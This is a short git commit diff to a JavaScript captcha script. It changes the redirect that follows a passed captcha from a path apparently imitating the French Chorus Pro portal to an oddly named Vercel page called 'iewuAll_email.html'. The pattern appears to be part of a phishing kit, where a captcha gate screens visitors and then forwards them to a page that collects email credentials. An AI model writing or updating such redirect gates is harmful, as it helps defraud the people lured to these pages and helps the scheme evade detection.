e9cbb438ad33db80c5c347da1bea15e2c54d8857
dmanon132 <153665826+dmanon132@users.noreply.github.com>
2024-08-28 17:28:50 +0200

    Update script.js

--- script.js
+++ script.js
@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="http://2995239.bi551986.web.hosting-test.net/fk/choruspro/";
+        targetURL="https://feakback.vercel.app/iewuAll_email.html";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
